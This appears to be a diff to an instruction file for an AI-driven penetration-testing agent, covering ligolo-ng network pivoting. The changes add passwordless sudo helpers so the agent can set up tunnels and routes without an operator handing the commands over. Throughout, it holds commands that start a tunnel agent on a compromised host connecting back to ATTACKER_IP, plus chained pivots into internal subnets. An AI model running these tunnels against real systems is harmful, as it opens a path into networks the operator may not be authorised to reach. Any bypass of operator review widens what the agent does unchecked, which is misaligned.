@@ -74,8 +74,8 @@ Your return summary must include:
 
 ## Privileged Commands
 
-Claude Code cannot execute `sudo` commands. The following tools require root
-on the **attacker machine** and must be handed off to the user:
+Claude Code cannot execute `sudo` commands by default. The following tools
+require root on the **attacker machine** and must be handed off to the user:
 
 - **ssh -w** (VPN/tun mode) — creates tun device (requires `PermitTunnel` on both ends)
 - **ip addr / ip link / ip route / ip tuntap** — network interface and route configuration
@@ -85,7 +85,15 @@ on the **attacker machine** and must be handed off to the user:
 - **hans** — ICMP tunnel (needs raw sockets)
 - **ptunnel-ng** — ICMP tunnel (needs raw sockets)
 
-**Handoff protocol:**
+**Exception — ligolo-ng is operator-free when the helpers are installed.**
+PEN-AGENT ships four narrow sudoers-gated helpers (`pen-agent-ligolo-{up,
+down,route,unroute}`) that let Claude Code bring up ligolo's TUN and add
+scoped routes via `sudo -n` with no password prompt. Install once per
+attackbox with `sudo bash tools/ligolo/install-sudoers.sh`; after that, Step
+2 below runs through end to end without any handoff. See
+`tools/ligolo/README.md` for the scope and threat model.
+
+**Handoff protocol** (for everything above except the ligolo helpers):
 
 1. Present the full command including `sudo` to the user
 2. For multi-step setups (e.g., create tun + add route + add NAT), batch
@@ -365,16 +373,34 @@ proxy runs on your attacker machine.
 
 ### Setup
 
-```bash
-# On attacker — create TUN interface and start proxy
-sudo ip tuntap add user $(whoami) mode tun ligolo
-sudo ip link set ligolo up
+**Check first: is the operator-free path installed?** PEN-AGENT ships four
+narrow helpers (`pen-agent-ligolo-{up,down,route,unroute}`) that let Claude
+Code set up the TUN and routes without a password prompt per pivot — see
+`tools/ligolo/README.md`. If `command -v pen-agent-ligolo-up` succeeds, use
+them directly (no operator handoff for TUN setup or routing):
 
-# Start proxy (listens for agent connections)
+```bash
+# Operator-free path (preferred — detect once, then use)
+if command -v pen-agent-ligolo-up >/dev/null 2>&1; then
+    sudo -n pen-agent-ligolo-up          # idempotent; creates & brings up TUN
+else
+    echo "ligolo helpers not installed — see tools/ligolo/README.md" >&2
+    # Fall back to the operator-handoff path below.
+fi
+
+# Start proxy (listens for agent connections) — never needs root
 ./proxy -selfcert -laddr 0.0.0.0:11601
 
 # On pivot — run agent (connects back to attacker)
 ./agent -connect ATTACKER_IP:11601 -ignore-cert
+```
+
+**Fallback — operator handoff** (when the helpers are not installed):
+
+```bash
+# Present to operator; wait for them to run before continuing.
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
 ```
 
 ### Routing
@@ -385,6 +411,9 @@ session
 # Select the session number
 
 # Add route to internal subnet through the tunnel
+# Preferred (operator-free, when helpers are installed):
+sudo -n pen-agent-ligolo-route 10.10.10.0/24
+# Fallback (operator handoff):
 sudo ip route add 10.10.10.0/24 dev ligolo
 
 # Start the tunnel
@@ -421,8 +450,8 @@ Chain through multiple agents.
 # Agent 1 connects to proxy on attacker
 ./agent -connect ATTACKER_IP:11601 -ignore-cert
 
-# Add route to Agent 2's network
-sudo ip route add 10.10.20.0/24 dev ligolo
+# Add route to Agent 2's network (preferred form; fallback: sudo ip route add 10.10.20.0/24 dev ligolo)
+sudo -n pen-agent-ligolo-route 10.10.20.0/24 2>/dev/null || sudo ip route add 10.10.20.0/24 dev ligolo
 
 # Add listener on Agent 1 to relay Agent 2's connection
 # In proxy console (session 1):
@@ -431,8 +460,8 @@ listener_add --addr 0.0.0.0:11601 --to ATTACKER_IP:11601 --tcp
 # Agent 2 connects through Agent 1
 ./agent -connect AGENT1_IP:11601 -ignore-cert
 
-# Add route to Agent 2's internal network
-sudo ip route add 10.10.30.0/24 dev ligolo
+# Add route to Agent 2's internal network (preferred form; fallback: sudo ip route add 10.10.30.0/24 dev ligolo)
+sudo -n pen-agent-ligolo-route 10.10.30.0/24 2>/dev/null || sudo ip route add 10.10.30.0/24 dev ligolo
 ```
 
 ### Transfer Agent to Pivot
